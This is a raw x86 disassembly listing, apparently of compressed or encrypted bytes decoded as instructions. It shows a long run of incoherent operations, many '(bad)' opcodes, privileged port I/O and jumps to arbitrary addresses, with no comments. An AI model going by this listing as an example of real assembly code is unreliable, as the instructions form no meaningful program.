  40ea15:	sub    DWORD PTR [ebx],0x8942eeef
  40ea1b:	mov    al,ds:0x4bf08b21
  40ea20:	leave  
  40ea21:	daa    
  40ea22:	pop    ss
  40ea23:	pop    es
  40ea24:	hlt    
  40ea25:	jae    0x40ea83
  40ea27:	pop    ebx
  40ea28:	jne    0x40ea90
  40ea2a:	push   cs
  40ea2b:	sub    esp,DWORD PTR [ebp-0x78]
  40ea2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea2f:	rcl    ebx,1
  40ea31:	out    0xa1,al
  40ea33:	(bad)  
  40ea34:	popw   ss
  40ea36:	in     al,dx
  40ea37:	jnp    0x40e9d0
  40ea39:	jb     0x40ea6b
  40ea3b:	shr    DWORD PTR [edx+0xe],0x74
  40ea3f:	mov    eax,0xd411f74b
  40ea44:	dec    esi
  40ea45:	nop
  40ea46:	sub    DWORD PTR [edx+0x8d3e875],ecx
  40ea4c:	rcr    DWORD PTR [ebx],cl
  40ea4e:	lods   al,BYTE PTR ds:[esi]
  40ea4f:	cli    
  40ea50:	ret    0xd438
  40ea53:	adc    BYTE PTR [esi-0x49ca2bea],dh
  40ea59:	fcom   DWORD PTR [esp+edx*2]
  40ea5c:	outs   dx,BYTE PTR ds:[esi]
  40ea5d:	dec    edi
  40ea5e:	(bad)  
  40ea5f:	cmp    ebx,DWORD PTR [ebp-0xc]
  40ea62:	jecxz  0x40ead5
  40ea64:	in     eax,0x7d
  40ea66:	xchg   esi,eax
  40ea67:	popf   
  40ea68:	dec    edx
  40ea69:	xor    esp,DWORD PTR [esi]
  40ea6b:	sahf   
  40ea6c:	inc    ecx
  40ea6d:	imul   edx,DWORD PTR [esi+0x4dc98612],0xffffff89
  40ea74:	fstp   QWORD PTR [edi+esi*1+0x317f637b]
  40ea7b:	dec    ebp
  40ea7c:	jno    0x40ea94
  40ea7e:	sbb    bl,dl
  40ea80:	sti    
  40ea81:	cmp    eax,0x2e95c21e
  40ea86:	das    
  40ea87:	add    eax,0x62dc0052
  40ea8c:	mov    esp,0xc6cc682e
  40ea91:	inc    eax
  40ea92:	xchg   esp,eax
  40ea93:	push   cs
  40ea94:	jnp    0x40eb01
  40ea96:	ja     0x40eab7
  40ea98:	clc    
  40ea99:	mov    cl,0xd2
  40ea9b:	add    eax,0x76a5e398
  40eaa0:	stc    
  40eaa1:	jo     0x40ea4b
  40eaa3:	pop    ds
  40eaa4:	adc    dl,cl
  40eaa6:	sub    al,0x28
  40eaa8:	fmul   DWORD PTR [ecx]
  40eaaa:	call   FWORD PTR [ecx]
  40eaac:	aaa    
  40eaad:	jle    0x40ea61
  40eaaf:	leave  
  40eab0:	mov    ds:0xcd26d5e4,eax
  40eab5:	stos   BYTE PTR es:[edi],al
  40eab6:	jo     0x40eaff
  40eab8:	and    DWORD PTR [edx],0xc2a057e2
  40eabe:	adc    al,0xc9
  40eac0:	les    esi,FWORD PTR [ebx-0x4b56891d]
  40eac6:	daa    
  40eac7:	inc    esi
  40eac8:	pop    es
  40eac9:	mov    BYTE PTR [edi+0x5fac5d92],ah
  40eacf:	push   ebx
  40ead0:	jbe    0x40ea62
  40ead2:	cmp    eax,0x718205c7
  40ead7:	(bad)  
  40ead8:	mov    bh,0x7
  40eada:	dec    ebx
  40eadb:	data16 fadd DWORD PTR [eax-0x55380fbb]
  40eae2:	adc    ebp,ebp
  40eae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae5:	aam    0x4b
  40eae7:	or     ebp,DWORD PTR [esi]
  40eae9:	test   al,0x3b
  40eaeb:	push   ebx
  40eaec:	loop   0x40eae2
  40eaee:	inc    ebp
  40eaef:	add    edx,DWORD PTR [ebp-0xd]
  40eaf2:	dec    esi
  40eaf3:	out    dx,eax
  40eaf4:	push   ebx
  40eaf5:	shr    BYTE PTR [ecx-0x1a11fc26],cl
  40eafb:	pop    ds
  40eafc:	js     0x40eac2
  40eafe:	xchg   esp,eax
  40eaff:	ins    DWORD PTR es:[di],dx
  40eb01:	jns    0x40eb6e
  40eb03:	frstor [eax+0x48]
  40eb06:	push   ss
  40eb07:	adc    dh,BYTE PTR [edi]
  40eb09:	nop
  40eb0a:	sub    bh,0xac
  40eb0d:	sbb    BYTE PTR [ebp+0x6f],dh
  40eb10:	or     esi,DWORD PTR [esi-0x4b]
  40eb13:	dec    ebx
  40eb14:	bound  ebx,QWORD PTR [eax+0x7237fae0]
  40eb1a:	bnd ja 0x40eaea
  40eb1d:	push   eax
  40eb1e:	add    eax,0xffffffc1
  40eb21:	mov    WORD PTR [esi],gs
  40eb23:	mov    ch,0x46
  40eb25:	add    eax,0xd9347149
  40eb2a:	jg     0x40eacc
  40eb2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb2d:	out    dx,eax
  40eb2e:	mov    bl,0x92
  40eb30:	sti    
  40eb31:	dec    esi
  40eb32:	ret    0x5bcf
  40eb35:	cdq    
  40eb36:	add    al,0x5
  40eb38:	jbe    0x40eb6f
  40eb3a:	push   edi
  40eb3b:	xor    al,0x48
  40eb3d:	mov    edi,DWORD PTR [edi+ecx*1+0x1e9cdc31]
  40eb44:	sub    bl,al
  40eb46:	and    esp,DWORD PTR ds:0xac20c28
  40eb4c:	push   0x6f
  40eb4e:	scas   eax,DWORD PTR es:[edi]
  40eb4f:	out    dx,al
  40eb50:	pop    edx
  40eb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb52:	sti    
  40eb53:	or     DWORD PTR [ebx+0x4],0x18
  40eb57:	pop    ss
  40eb58:	xor    DWORD PTR [esp+ebx*4+0x6c],esp
  40eb5c:	mov    bh,0x3b
  40eb5e:	inc    esp
  40eb5f:	je     0x40eb86
  40eb61:	push   ebx
  40eb62:	std    
  40eb63:	jne    0x40ebd1
  40eb65:	push   esi
  40eb66:	test   BYTE PTR [eax-0x46],cl
  40eb69:	popa   
  40eb6a:	std    
  40eb6b:	js     0x40ebe9
  40eb6d:	lock jle 0x40eaff
  40eb70:	sbb    ebp,DWORD PTR [edx]
  40eb72:	popf   
  40eb73:	sbb    eax,0x51242090
  40eb78:	inc    ebx
  40eb79:	mov    DWORD PTR [edi-0x6b84b7df],ebp
  40eb7f:	mov    edi,ds
  40eb81:	pop    DWORD PTR [eax+0x7bc4d59d]
  40eb87:	jecxz  0x40ebdc
  40eb89:	sub    al,0xf8
  40eb8b:	add    eax,0xf7358a27
  40eb90:	idiv   BYTE PTR [edx+edx*8-0x66]
  40eb94:	fcmovnb st,st(5)
  40eb96:	repz jecxz 0x40eb40
  40eb99:	leave  
  40eb9a:	sub    eax,0xeeb835e5
  40eb9f:	mov    ecx,0xdf2c0d3a
  40eba4:	retf   
  40eba5:	(bad)  
  40eba6:	loopne 0x40eb75
  40eba8:	outs   dx,BYTE PTR ds:[esi]
  40eba9:	jg     0x40ebf5
  40ebab:	add    bh,BYTE PTR [eax-0x18]
  40ebae:	outs   dx,BYTE PTR ds:[esi]
  40ebaf:	sbb    edx,DWORD PTR [edx+0x52]
  40ebb2:	test   eax,0x2f4beea8
  40ebb7:	sbb    DWORD PTR [esi+0x10],0xffffffc7
  40ebbb:	adc    eax,0x3cd0a2b3
  40ebc0:	fwait
  40ebc1:	jne    0x40eb9b
  40ebc3:	pushf  
  40ebc4:	es mov bh,0xc
  40ebc7:	cwde   
  40ebc8:	(bad)  
  40ebca:	fst    QWORD PTR [ebp+0x10]
  40ebcd:	iret   
  40ebce:	mov    bh,cl
  40ebd0:	adc    al,0x1e
  40ebd2:	rol    BYTE PTR [eax],cl
  40ebd4:	loopne 0x40eb7e
  40ebd6:	into   
  40ebd7:	mov    ch,0x53
  40ebd9:	mov    ebx,es
  40ebdb:	ror    BYTE PTR [ecx],0x4
  40ebde:	call   0xa6e:0x13b8460c
  40ebe5:	loopne 0x40ebb4
  40ebe7:	sub    BYTE PTR [edx],cl
  40ebe9:	(bad)  
  40ebea:	sti    
  40ebeb:	mov    bh,0xde
  40ebed:	add    DWORD PTR [ecx+0x79],edi
  40ebf0:	ror    DWORD PTR [ebp-0x3ee50d31],0x10
  40ebf7:	adc    al,0x98
  40ebf9:	outs   dx,DWORD PTR ds:[esi]
  40ebfa:	sbb    ch,BYTE PTR [edi+ecx*2+0x6b9c0d5e]
  40ec01:	out    0x31,al
  40ec03:	ja     0x40ec72
  40ec05:	push   cs
  40ec06:	push   ebp
  40ec07:	pop    ss
  40ec08:	pop    esi
  40ec09:	inc    ebp
  40ec0a:	ficomp WORD PTR [ecx+0x2904695f]
  40ec10:	test   BYTE PTR [ecx-0x79],ch
  40ec13:	jnp    0x40ebb5
  40ec15:	jo     0x40ec0c
  40ec17:	shr    ebp,1
  40ec19:	jge    0x40ec32
  40ec1b:	inc    esi
  40ec1c:	stos   BYTE PTR es:[edi],al
  40ec1d:	mov    dh,0x59
  40ec1f:	sub    ax,0xfba9
  40ec23:	in     eax,dx
  40ec24:	xor    BYTE PTR [edx],bl
  40ec26:	sbb    esi,esp
  40ec28:	in     eax,0x58
  40ec2a:	neg    DWORD PTR [ecx+0x43]
  40ec2d:	into   
  40ec2e:	jecxz  0x40ebfd
  40ec30:	cli    
  40ec31:	cmp    eax,0x737e8ad2
  40ec36:	stos   BYTE PTR es:[edi],al
  40ec37:	inc    ecx
  40ec38:	inc    esi
  40ec39:	mov    esi,DWORD PTR [ebx+0x75389b7d]
  40ec3f:	inc    BYTE PTR [edi+0x2d]
  40ec42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec43:	div    DWORD PTR [eax+eax*8-0x46]
  40ec47:	loop   0x40ec6c
  40ec49:	mov    al,ds:0x11d25aec
  40ec4e:	jb     0x40ec3c
  40ec50:	or     ah,dh
  40ec52:	inc    ecx
  40ec53:	inc    edx
  40ec54:	loop   0x40ecaf
  40ec56:	or     DWORD PTR [eax+0x56a74466],esp
  40ec5c:	or     eax,0x34d614f5
  40ec61:	test   BYTE PTR [eax],ch
  40ec63:	arpl   WORD PTR [edx],bx
  40ec65:	push   ebx
  40ec66:	cld    
  40ec67:	xchg   edi,eax
  40ec68:	repnz (bad) [esp+ebx*1]
  40ec6c:	loopne 0x40ecb0
  40ec6e:	in     eax,0x24
  40ec70:	jne    0x40ec3c
  40ec72:	fdivr  st(5),st
  40ec74:	fisubr WORD PTR [eax+0x52201749]
  40ec7a:	pop    ebp
  40ec7b:	pop    eax
  40ec7c:	sub    al,0x72
  40ec7e:	adc    edi,0x12
  40ec81:	cdq    
  40ec82:	fadd   st,st(5)
  40ec84:	sub    DWORD PTR [eax+0x67b40f13],0x79390ee5
  40ec8e:	sub    eax,0x9a2c06f8
  40ec93:	icebp  
  40ec94:	add    dl,BYTE PTR [ecx-0x43]
  40ec97:	sbb    DWORD PTR [ebp-0x67],0x75fcdcea
  40ec9e:	mov    ch,0x14
  40eca0:	ins    DWORD PTR es:[edi],dx
  40eca1:	sbb    BYTE PTR [ecx-0x1c6f3b76],dh
  40eca7:	(bad)  
  40eca9:	iret   
  40ecaa:	test   ecx,0x12165cec
  40ecb0:	jns    0x40eca8
  40ecb2:	push   edi
  40ecb3:	stos   DWORD PTR es:[edi],eax
  40ecb4:	rcl    DWORD PTR [ebx-0x67],0xf
  40ecb8:	push   ebx
  40ecb9:	test   al,0xa0
  40ecbb:	test   eax,0x4b0c9c89
  40ecc0:	iret   
  40ecc1:	ins    BYTE PTR es:[edi],dx
  40ecc2:	inc    ebx
  40ecc3:	mov    bl,BYTE PTR [esi-0x7f]
  40ecc6:	in     al,dx
  40ecc7:	(bad)  
  40ecc8:	in     al,dx
  40ecc9:	pop    esi
  40ecca:	shl    DWORD PTR [edi-0x2a09018c],1
  40ecd0:	(bad)  
  40ecd1:	fild   WORD PTR [esi+eax*4-0x77527836]
  40ecd8:	and    BYTE PTR [esi-0x5b1127d4],al
  40ecde:	mov    al,ds:0xd6a7db28
  40ece3:	int    0xd3
  40ece5:	retf   
  40ece6:	mov    eax,ds:0xd22e701
  40eceb:	dec    esp
  40ecec:	jp     0x40ecf2
  40ecee:	add    ecx,esp
  40ecf0:	mov    bh,BYTE PTR [eax-0x9e61f8f]
  40ecf6:	icebp  
  40ecf7:	or     eax,0x68f21b3d
  40ecfc:	jne    0x40ec94
  40ecfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecff:	xchg   esp,eax
  40ed00:	sub    BYTE PTR [ebx-0x1139e2cf],cl
  40ed06:	cmp    ch,BYTE PTR [esi-0x65]
  40ed09:	push   edx
  40ed0a:	xchg   esp,eax
  40ed0b:	xchg   ecx,eax
  40ed0c:	push   edi
  40ed0d:	cmp    esp,DWORD PTR [edx]
  40ed0f:	fadd   st(0),st
  40ed11:	and    ecx,DWORD PTR [edi+0x552be3da]
  40ed17:	jne    0x40ed86
  40ed19:	sti    
  40ed1a:	mov    al,ds:0x9f7e1fcf
  40ed1f:	pop    ebp
  40ed20:	xchg   edi,edx
  40ed22:	pop    edi
  40ed23:	sbb    al,0x4c
  40ed25:	cmc    
  40ed26:	push   esp
  40ed27:	cmp    esi,DWORD PTR [edi]
  40ed29:	shl    edi,1
  40ed2b:	data16 cmc 
  40ed2d:	mov    ah,0x72
  40ed2f:	jmp    0x40ed85
  40ed31:	pop    ss
  40ed32:	pop    ebp
  40ed33:	loope  0x40eda1
  40ed35:	and    BYTE PTR ds:0xcd383a95,dh
  40ed3b:	aas    
  40ed3c:	dec    ebp
  40ed3d:	dec    edi
  40ed3e:	jmp    0x40ed7c
  40ed40:	cmp    bl,cl
  40ed42:	es jle 0x40ed51
  40ed45:	mov    cs,esp
  40ed47:	sar    BYTE PTR [eax-0x15a2fb88],1
  40ed4d:	dec    ecx
  40ed4e:	or     DWORD PTR [ebx],esi
  40ed50:	push   esp
  40ed51:	fsub   DWORD PTR [edx-0x264f5d98]
  40ed57:	(bad)  
  40ed58:	push   0x51
  40ed5a:	leave  
  40ed5b:	adc    eax,0x90165edd
  40ed60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed61:	and    BYTE PTR [ebp+esi*8-0x7e],bh
  40ed65:	mov    ebx,0xcd1baf81
  40ed6a:	fs es das 
  40ed6d:	adc    ah,dh
  40ed6f:	fbld   TBYTE PTR [ecx]
  40ed71:	shl    BYTE PTR [esi],cl
  40ed73:	cmp    BYTE PTR [edi+ebx*8-0x74685dfb],0xf8
  40ed7b:	es out dx,eax
  40ed7d:	test   DWORD PTR ds:0x53fa4524,esi
  40ed83:	add    eax,DWORD PTR [ebx-0x4a0dabf3]
  40ed89:	or     DWORD PTR [esi],ebx
  40ed8b:	repnz sbb DWORD PTR [eax+0x142255f3],0x4c0b59dd
  40ed96:	test   BYTE PTR [eax+ebx*1+0x8d60cd5],0x1b
  40ed9e:	sub    eax,0xd1e361d0
  40eda3:	pop    ss
  40eda4:	mov    WORD PTR [ebx-0x34e08a2e],?
  40edaa:	std    
  40edab:	and    al,0xd3
  40edad:	sbb    ah,dh
  40edaf:	leave  
  40edb0:	int    0xbe
  40edb2:	aas    
  40edb3:	xor    al,al
  40edb5:	fs adc cl,ch
  40edb8:	push   ss
  40edb9:	pop    esp
  40edba:	jnp    0x40edfd
  40edbc:	mov    ebx,DWORD PTR [esi-0x4552867f]
  40edc2:	addr16 pop ss
  40edc4:	cmp    BYTE PTR [edx],dl
  40edc6:	ds loope 0x40ee37
  40edc9:	sbb    BYTE PTR [esi],dh
  40edcb:	sub    bh,al
  40edcd:	and    ebp,ebp
  40edcf:	imul   esi,DWORD PTR [ecx+0x654b0767],0xafd5fb60
  40edd9:	test   al,0xce
  40eddb:	div    ch
  40eddd:	fiadd  DWORD PTR [esi+0x60bea2d]
  40ede3:	fdiv   QWORD PTR [ebp-0x8955a58]
  40ede9:	mov    dl,0xde
  40edeb:	pop    esp
  40edec:	repz cmp DWORD PTR fs:[esi+0x64],eax
  40edf1:	loope  0x40eddb
  40edf3:	push   ss
  40edf4:	jl     0x40ee6d
  40edf6:	and    bh,dl
  40edf8:	mov    di,0x173
  40edfc:	int    0x1b
  40edfe:	or     dh,BYTE PTR [ebx]
  40ee00:	sub    al,0x6e
  40ee02:	cs ret 
  40ee04:	shl    DWORD PTR ds:0x4790ea7e,1
  40ee0a:	ret    0xad30
  40ee0d:	mov    edi,0x61d06156
  40ee12:	pop    ss
  40ee13:	out    0x5a,al
  40ee15:	cmp    esp,esp
  40ee17:	push   ebp
  40ee18:	push   edx
  40ee1a:	mov    al,0x57
  40ee1c:	fsub   st,st(4)
  40ee1e:	jns    0x40edb8
  40ee20:	xchg   ecx,eax
  40ee21:	push   esi
  40ee22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee23:	and    DWORD PTR [ebp+0x6038fb4c],0x5a1c3a87
  40ee2d:	cld    
  40ee2e:	jne    0x40edb4
  40ee30:	bound  edi,QWORD PTR [edi+0x54]
  40ee33:	ss pop ebx
  40ee35:	pop    esp
  40ee36:	and    ebx,DWORD PTR [edx]
  40ee38:	int    0xf
  40ee3a:	mov    cl,0xc4
  40ee3c:	push   ds
  40ee3d:	push   esp
  40ee3e:	dec    edx
  40ee3f:	inc    esi
  40ee40:	aaa    
  40ee41:	js     0x40eeba
  40ee43:	adc    eax,ebx
  40ee45:	push   edi
  40ee46:	inc    ebx
  40ee47:	out    dx,eax
  40ee48:	lock (bad) 
  40ee4a:	jmp    0x40ee40
  40ee4c:	aam    0x2f
  40ee4e:	fld    TBYTE PTR [edx+0x5e32e89d]
  40ee54:	loop   0x40ee67
  40ee56:	xchg   edx,eax
  40ee57:	mov    ecx,0x9494a39f
  40ee5c:	das    
  40ee5d:	mov    dh,0xb0
  40ee5f:	ficomp WORD PTR [ebp+0x71d5a0d9]
  40ee65:	cwde   
  40ee66:	mov    bh,0x1f
  40ee68:	dec    ebp
  40ee69:	das    
  40ee6a:	jg     0x40ee87
  40ee6c:	fninit 
  40ee6e:	lds    eax,FWORD PTR [ebx]
  40ee70:	stos   BYTE PTR es:[edi],al
  40ee71:	das    
  40ee72:	ret    0xfb7d
  40ee75:	pop    edx
  40ee76:	inc    ecx
  40ee77:	jnp    0x40eef4
  40ee79:	cmp    BYTE PTR [ebp-0x6e],bh
  40ee7c:	cs or  ah,bh
  40ee7f:	sub    al,0xf5
  40ee81:	or     BYTE PTR [edi+esi*4+0x65],0x7a
  40ee86:	jnp    0x40ee43
  40ee88:	inc    ecx
  40ee89:	jmp    0x40ee99
  40ee8b:	cli    
  40ee8c:	xor    DWORD PTR [edi+edi*1+0x6d071048],eax
  40ee93:	enter  0x8717,0xb8
  40ee97:	bound  esp,QWORD PTR [ecx-0x76bf3b7a]
  40ee9d:	js     0x40eecc
  40ee9f:	cli    
  40eea0:	pusha  
  40eea1:	outs   dx,BYTE PTR fs:[esi]
  40eea3:	cs stos BYTE PTR es:[edi],al
  40eea5:	push   ebx
  40eea6:	sub    bh,0xb4
  40eea9:	jb     0x40ee9a
  40eeab:	nop
  40eeac:	dec    esi
  40eead:	retf   0x911b
  40eeb0:	push   esp
  40eeb1:	inc    esi
  40eeb2:	pop    edx
  40eeb3:	mov    bh,0xea
  40eeb5:	push   ecx
  40eeb6:	push   ss
  40eeb7:	mov    bl,0x66
  40eeb9:	test   eax,0xadf391ba
  40eebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eebf:	sti    
  40eec0:	inc    ebp
  40eec1:	push   ebp
  40eec2:	test   eax,0x581ff37d
  40eec7:	es mov ebx,0x9f10dff2
  40eecd:	mul    DWORD PTR [eax+0x20]
  40eed0:	loopne 0x40eea8
  40eed2:	loop   0x40ef03
  40eed4:	gs pop esp
  40eed6:	into   
  40eed7:	test   DWORD PTR [ebx+0x6e223e3a],ebx
  40eedd:	push   ecx
  40eede:	pop    esi
  40eedf:	sbb    al,0xc3
  40eee1:	adc    ecx,DWORD PTR [edx]
  40eee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eee4:	push   ecx
  40eee5:	pop    ss
  40eee6:	jns    0x40eecd
  40eee8:	or     al,BYTE PTR [eax+0xa]
  40eeeb:	aas    
  40eeec:	test   BYTE PTR [edx],dh
  40eeee:	loope  0x40ee76
  40eef0:	lods   eax,DWORD PTR ds:[esi]
  40eef1:	adc    al,0x28
  40eef3:	dec    esi
  40eef4:	jbe    0x40ef3e
  40eef6:	fisttp WORD PTR [ebx]
  40eef8:	or     al,0xd
  40eefa:	mov    eax,gs
  40eefc:	mov    dh,0x2a
  40eefe:	or     bl,ch
  40ef00:	pop    edx
  40ef01:	leave  
  40ef02:	push   eax
  40ef03:	in     eax,dx
  40ef04:	fbstp  TBYTE PTR [ecx-0x37]
  40ef07:	imul   ebp,ecx,0xffffff89
  40ef0a:	iret   
  40ef0b:	xor    DWORD PTR [edx+0xa],eax
  40ef0e:	(bad)  
  40ef0f:	adc    eax,0x554bdf4c
  40ef14:	push   eax
  40ef15:	lds    edi,FWORD PTR ds:0x180c1a03
  40ef1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef1c:	adc    BYTE PTR [edx-0x75d174d9],bl
  40ef22:	inc    esp
  40ef23:	mov    bh,0xaa
  40ef25:	xchg   esi,eax
  40ef26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef27:	and    BYTE PTR [esi],al
  40ef29:	xor    DWORD PTR [ecx+0x788f1744],0x8a309be5
  40ef33:	sub    al,0x72
  40ef35:	mov    ds,eax
  40ef37:	jno    0x40ef3f
  40ef39:	gs ds das 
  40ef3c:	outs   dx,BYTE PTR ds:[esi]
  40ef3d:	dec    ebp
  40ef3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef3f:	retf   0xf30f
  40ef42:	adc    al,0x87
  40ef44:	push   ebp
  40ef45:	sub    dh,BYTE PTR [edi+0x63fecc3c]
  40ef4b:	pop    eax
  40ef4c:	daa    
  40ef4d:	ins    DWORD PTR es:[edi],dx
  40ef4e:	retf   
  40ef4f:	sub    esi,DWORD PTR [edx]
  40ef51:	clc    
  40ef52:	add    eax,0x265cc578
  40ef57:	xchg   esi,eax
  40ef58:	xor    al,0x35
  40ef5a:	jl     0x40ef40
  40ef5c:	out    0x5d,eax
  40ef5e:	test   DWORD PTR [ebx-0x5],ebp
  40ef61:	jns    0x40efba
  40ef63:	mov    bl,0x7a
  40ef65:	inc    ebp
  40ef66:	lds    esi,FWORD PTR [ecx]
  40ef68:	imul   edi,DWORD PTR [esi+ebp*2-0x45311571],0xffffffe6
  40ef70:	pusha  
  40ef71:	mov    bh,0x61
  40ef73:	sbb    eax,0x17e92fe4
  40ef78:	(bad)  
  40ef79:	pusha  
  40ef7a:	add    esp,ebx
  40ef7c:	and    BYTE PTR [esi+0x46],0x3b
  40ef80:	inc    esi
  40ef81:	stos   BYTE PTR es:[edi],al
  40ef82:	mov    cl,BYTE PTR [ebx+0x47e4b397]
  40ef88:	sub    DWORD PTR ds:0x85f602c1,esp
  40ef8e:	push   edi
  40ef8f:	mov    al,0xb4
  40ef91:	lahf   
  40ef92:	jg     0x40ef7d
  40ef94:	in     eax,0xe4
  40ef96:	sti    
  40ef97:	cmp    eax,0x4ee5c247
  40ef9c:	push   ss
  40ef9d:	call   0x9a2ad562
  40efa2:	inc    ebp
  40efa3:	shl    BYTE PTR [edi-0x6b],1
  40efa6:	pop    eax
  40efa7:	test   BYTE PTR [ebp-0x5d],dl
  40efaa:	ret    
  40efab:	out    dx,al
  40efac:	shl    DWORD PTR [ebx],cl
  40efae:	cwde   
  40efaf:	fst    DWORD PTR [eax+0xf]
  40efb2:	xchg   edx,eax
  40efb3:	mov    bl,0xf6
  40efb5:	div    BYTE PTR [edi-0x50f66d7]
  40efbb:	lock cld 
  40efbd:	scas   al,BYTE PTR es:[edi]
  40efbe:	jo     0x40f015
  40efc0:	push   ebp
  40efc1:	push   ecx
  40efc2:	loope  0x40ef58
  40efc4:	out    dx,al
  40efc5:	js     0x40efaa
  40efc7:	and    al,0x22
  40efc9:	dec    ecx
  40efca:	pop    esi
  40efcb:	mov    ds:0xa81cb93d,al
  40efd0:	in     eax,dx
  40efd1:	retf   0xeae5
  40efd4:	pop    ebx
  40efd5:	mov    ch,0x27
  40efd7:	mov    ds:0x761bde65,al
  40efdc:	dec    ebp
  40efdd:	pushf  
  40efde:	rcr    ah,1
  40efe0:	aad    0x11
  40efe2:	ficomp DWORD PTR [eax+0x38fd42c5]
  40efe8:	bound  edi,QWORD PTR [edx+0x18]
  40efeb:	adc    eax,0x10ea9cbc
  40eff0:	sahf   
  40eff1:	jmp    0xafdb073a
  40eff6:	int    0x87
  40eff8:	sub    eax,DWORD PTR [bx+si]
  40effb:	out    0x52,al
  40effd:	bound  edx,QWORD PTR [edi-0x3b]
  40f000:	xor    DWORD PTR [edi-0x12],eax
  40f003:	cmp    BYTE PTR [ecx],dh
  40f005:	mov    eax,0x3dd6a9d9
  40f00a:	shr    BYTE PTR [esp+eiz*4],cl
  40f00d:	adc    bh,ch
  40f00f:	stos   BYTE PTR es:[edi],al
  40f010:	outs   dx,DWORD PTR ds:[esi]
  40f011:	ds xchg bh,bl
  40f014:	adc    edx,DWORD PTR [edx+0x2c]
  40f017:	sub    ebx,DWORD PTR [edx+0x5ce93cec]
  40f01d:	in     eax,dx
  40f01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f01f:	cwde   
  40f020:	ins    BYTE PTR es:[edi],dx
  40f021:	sub    bh,bh
  40f023:	mov    bh,0x80
  40f025:	pop    ecx
  40f026:	pop    es
  40f027:	cmc    
  40f028:	jl     0x40efca
  40f02a:	sti    
  40f02b:	nop
  40f02c:	es aad 0xf9
  40f02f:	sub    edx,DWORD PTR [esi]
  40f031:	sub    esi,DWORD PTR [ecx+0x1889ec32]
  40f037:	cmp    ebx,DWORD PTR [ecx-0x5c203802]
  40f03d:	mov    dl,0x59
  40f03f:	fistp  DWORD PTR ds:0xc72941d3
  40f045:	out    dx,eax
  40f046:	es scas al,BYTE PTR es:[edi]
  40f048:	nop
  40f049:	adc    al,0xaa
  40f04b:	sbb    DWORD PTR [esi],eax
  40f04d:	push   esi
  40f04e:	in     al,0xbb
  40f050:	or     al,0x4d
  40f052:	xor    eax,ebp
  40f054:	call   0x3516f5db
  40f059:	xor    edi,DWORD PTR [ebp-0x1f]
  40f05c:	jae    0x40efff
  40f05e:	jns    0x40f0a8
  40f060:	mov    ds:0xc2205343,al
  40f065:	fiadd  DWORD PTR [ebx+esi*2-0x41f99b04]
  40f06c:	stos   DWORD PTR es:[edi],eax
  40f06d:	lock mov eax,ds:0x58552e49
  40f073:	inc    ebp
  40f074:	mov    ebx,0xd53c003d
  40f079:	lods   eax,DWORD PTR ds:[esi]
  40f07a:	add    BYTE PTR [ebx],bl
  40f07c:	pushf  
  40f07d:	mov    dl,0x12
  40f07f:	jb     0x40f0e4
  40f081:	(bad)  
  40f082:	jl     0x40f027
  40f084:	scas   al,BYTE PTR es:[edi]
  40f085:	ror    DWORD PTR [ecx],0xa6
  40f088:	push   ds
  40f089:	lahf   
  40f08a:	in     eax,0xf1
  40f08c:	cmp    DWORD PTR [ecx-0x476321c1],esi
  40f092:	cmp    ecx,DWORD PTR [esi-0x31]
  40f095:	cmp    dh,BYTE PTR [ebx-0x1d]
  40f098:	ret    0x6b05
  40f09b:	inc    esi
  40f09c:	adc    eax,0x41a46e7c
  40f0a1:	fnstcw WORD PTR [ecx+ecx*1-0xc]
  40f0a5:	or     ebx,eax
  40f0a7:	mov    esi,0xa5b1e8a
  40f0ac:	pop    esp
  40f0ad:	cs std 
  40f0af:	lock retf 
  40f0b1:	dec    ecx
  40f0b2:	pop    edi
  40f0b3:	jg     0x40f0e6
  40f0b5:	pop    esi
  40f0b6:	inc    ebp
  40f0b7:	cs xchg ebp,eax
  40f0b9:	ss cmc 
  40f0bb:	lahf   
  40f0bc:	fistp  QWORD PTR [eax-0x32]
  40f0bf:	cmp    eax,0xe9412ab7
  40f0c4:	dec    ebx
  40f0c5:	xchg   esp,eax
  40f0c6:	loopne 0x40f0d4
  40f0c8:	jbe    0x40f0bc
  40f0ca:	inc    ebx
  40f0cb:	jp     0x40f145
  40f0cd:	add    BYTE PTR [ecx+0x17],bl
  40f0d0:	and    al,0x80
  40f0d2:	fdiv   DWORD PTR [edi+0x78]
  40f0d5:	(bad)  
  40f0d6:	cmp    BYTE PTR [ecx],dl
  40f0d8:	or     esi,ebx
  40f0da:	mov    dh,0xfe
  40f0dc:	sub    DWORD PTR [esi],edx
  40f0de:	(bad)  
  40f0df:	neg    DWORD PTR [edx]
  40f0e1:	(bad)  [esi]
  40f0e3:	cmp    al,dh
  40f0e5:	or     al,0x43
  40f0e7:	sub    edx,ebx
  40f0e9:	scas   eax,DWORD PTR es:[edi]
  40f0ea:	xchg   ebx,eax
  40f0eb:	fiadd  WORD PTR [eax]
  40f0ed:	mov    eax,ds:0x47fd182b
  40f0f2:	icebp  
  40f0f3:	jae    0x40f08e
  40f0f5:	dec    esp
  40f0f6:	or     esp,DWORD PTR [edi-0x77d0a688]
  40f0fc:	pusha  
  40f0fd:	mov    es,WORD PTR [eax]
  40f0ff:	out    dx,eax
  40f100:	and    BYTE PTR [ebp-0x1a],cl
  40f103:	daa    
  40f104:	es dec eax
  40f106:	cmp    dh,BYTE PTR [esi-0xf]
  40f109:	sub    dl,BYTE PTR ds:0x9fd82d80
  40f10f:	push   0x5e
  40f111:	fcom   DWORD PTR [ebx+0x77c7190a]
  40f117:	cmp    DWORD PTR [esi+0x2c],0x51d5bf1e
  40f11e:	es js  0x40f116
  40f121:	out    dx,eax
  40f122:	mov    ebx,edx
  40f124:	xor    al,0x95
  40f126:	shl    esi,0x54
  40f129:	test   eax,0x543a3dc
